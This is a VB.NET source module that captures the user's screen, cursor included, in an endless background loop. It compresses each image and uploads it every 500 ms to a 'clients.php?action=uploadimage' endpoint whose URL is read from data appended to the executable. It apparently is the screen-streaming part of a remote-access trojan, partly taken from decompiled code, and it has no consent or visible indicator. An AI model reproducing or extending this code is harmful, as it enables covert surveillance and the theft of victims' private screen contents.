Imports System.ComponentModel
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Runtime.InteropServices
Imports System.Threading

Module Screenshare

    ' Private m_MyForm As MainForm
    'Public ReadOnly Property MyForm() As MainForm
    'Get
    'If IsNothing(m_MyForm) Then m_MyForm = New MainForm
    'Return m_MyForm
    'End Get
    'End Property

    Private vpsURL As String

    Private Structure PointAPI
        Public x As Integer
        Public y As Integer
    End Structure
    Private Structure CursorInfo
        ' Token: 0x04000037 RID: 55
        Public cbSize As Integer

        ' Token: 0x04000038 RID: 56
        Public flags As Integer

        ' Token: 0x04000039 RID: 57
        Public hCursor As IntPtr

        ' Token: 0x0400003A RID: 58
        Public ptScreenPos As PointAPI
    End Structure

    Private Declare Function GetCursorInfo Lib "user32.dll" (<System.Runtime.InteropServices.OutAttribute()> ByRef pci As CursorInfo) As Boolean
    Private Declare Function DrawIcon Lib "user32.dll" (hDC As IntPtr, X As Integer, Y As Integer, hIcon As IntPtr) As Boolean

    Public WithEvents screenshareBW As BackgroundWorker
    Public screenshareQuality As Long = 25L
    Public screenshareFluxInterval As Integer = 500

    Public Sub InitFluxManager(vpsURL As String)
        Me.vpsURL = vpsURL
        screenshareBW = New BackgroundWorker()
        screenshareBW.WorkerSupportsCancellation = True
    End Sub

    Public Function GetEncoderInfo(ByVal mimeType As String) As ImageCodecInfo
        Dim j As Integer
        Dim encoders As ImageCodecInfo()
        encoders = ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length - 1
            If encoders(j).MimeType = mimeType Then Return encoders(j)
        Next
        Return Nothing
    End Function

    Public Function TakeBitmapScreenshot() As Bitmap
        Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
        Dim result As Bitmap
        Try
            Dim bitmap As Bitmap = New Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb)
            Dim graphics As Graphics = Graphics.FromImage(bitmap)
            graphics.CopyFromScreen(0, 0, 0, 0, New Size(bitmap.Width, bitmap.Height), CopyPixelOperation.SourceCopy)
            Dim cursorInfo As CursorInfo
            cursorInfo.cbSize = Marshal.SizeOf(GetType(CursorInfo))
            Dim flag As Boolean = GetCursorInfo(cursorInfo) AndAlso cursorInfo.flags = 1
            If flag Then
                DrawIcon(graphics.GetHdc(), cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, cursorInfo.hCursor)
                graphics.ReleaseHdc()
            End If
            graphics.Dispose()
            result = bitmap
        Catch
            result = New Bitmap(bounds.Width, bounds.Height)
        End Try
        Return result
    End Function
    Public Function ResizeConvertBMP(bitmapData As Bitmap, imgQuality As Long) As Byte()
        Dim myEncoderParameters = New EncoderParameters(1)
        myEncoderParameters.Param(0) = New EncoderParameter(Imaging.Encoder.Quality, imgQuality)

        Dim MS As MemoryStream = New MemoryStream()
        Dim resizedBmp = New Bitmap(bitmapData, New Size(1600, 1050))
        resizedBmp.Save(MS, GetEncoderInfo("image/jpeg"), myEncoderParameters)

        Dim bmpBytes As Byte() = MS.GetBuffer()
        bitmapData.Dispose()
        MS.Close()

        Return bmpBytes
    End Function

    Function DeflateCompress(ByVal toCompress As Byte()) As Byte()
        Using inputStream As MemoryStream = New MemoryStream(toCompress)

            Using outputStream As MemoryStream = New MemoryStream()
                Using compressionStream As DeflateStream =
                New DeflateStream(outputStream, CompressionMode.Compress)
                    inputStream.CopyTo(compressionStream)
                End Using

                Return outputStream.ToArray()
            End Using

        End Using
    End Function

    Private Sub screenshareBW_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles screenshareBW.DoWork
        While True
            Dim startTime = DateTime.Now

            Dim compressedBmpBytes As Byte() =
               DeflateCompress(ResizeConvertBMP(TakeBitmapScreenshot(), screenshareQuality))

            MsgBox(MainForm.EOFArguments(0))
            MainForm.mainWebClient.UploadData(MainForm.EOFArguments(0) & "clients.php?action=uploadimage", compressedBmpBytes)

            Dim msTimeout As Integer = screenshareFluxInterval - Date.Now.Subtract(startTime).TotalMilliseconds

            If msTimeout < 1 Then
                Continue While
            Else
                Thread.Sleep(msTimeout)
            End If
        End While
    End Sub
End Module
